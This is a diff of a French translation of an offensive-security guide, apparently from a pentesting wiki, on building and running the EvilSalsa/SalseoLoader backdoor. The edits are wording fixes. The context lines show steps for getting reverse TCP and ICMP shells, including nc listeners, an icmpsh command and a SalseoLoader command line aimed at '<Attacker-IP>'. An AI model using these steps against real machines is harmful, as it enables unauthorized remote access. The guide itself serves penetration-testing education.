@@ -4,13 +4,13 @@
 
 ## Compilation des binaires
 
-Téléchargez le code source depuis github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.
+Téléchargez le code source depuis GitHub et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.
 
-Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (Si Windows supporte x64, compilez-les pour cette architecture).
+Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (Si Windows prend en charge x64, compilez-les pour cette architecture).
 
-Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche dans **"Platform Target".**
+Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'**onglet "Build" à gauche** dans **"Platform Target".**
 
-(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Nom du Projet> Properties"**)
+(**Si vous ne trouvez pas cette option, cliquez sur **"Project Tab"** puis sur **"\<Nom du Projet> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -38,7 +38,7 @@ D'accord, maintenant vous avez tout ce qu'il vous faut pour exécuter toutes les
 
 ## **Exécuter le backdoor**
 
-### **Obtenir un shell inverse TCP (téléchargement du dll encodé via HTTP)**
+### **Obtenir un shell inverse TCP (télécharger le dll encodé via HTTP)**
 
 N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inverse et un serveur HTTP pour servir l'evilsalsa encodé.
 ```
@@ -69,7 +69,7 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Compiler SalseoLoader en tant que DLL exportant la fonction principale
+## Compilation de SalseoLoader en tant que DLL exportant la fonction principale
 
 Ouvrez le projet SalseoLoader avec Visual Studio.
 
@@ -83,7 +83,7 @@ Ouvrez le projet SalseoLoader avec Visual Studio.
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez le popup)**
+#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -91,7 +91,7 @@ Dans votre dossier de projet, les fichiers suivants sont apparus : **DllExport.b
 
 ### **D** désinstaller DllExport
 
-Appuyez sur **Désinstaller** (ouais, c'est bizarre mais faites-moi confiance, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est étrange mais faites-moi confiance, c'est nécessaire)
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
@@ -111,7 +111,7 @@ Sélectionnez **x64** (si vous allez l'utiliser à l'intérieur d'une boîte x64
 
 ![](<../images/image (8) (1).png>)
 
-### Construire la solution
+### Construisez la solution
 
 Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)
 
@@ -123,9 +123,9 @@ Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Bu
 
 Pour **construire** la solution : Build --> Build Solution (Dans la console de sortie, le chemin de la nouvelle DLL apparaîtra)
 
-### Testez la Dll générée
+### Testez la DLL générée
 
-Copiez et collez la Dll où vous souhaitez la tester.
+Copiez et collez la DLL où vous souhaitez la tester.
 
 Exécutez :
 ```
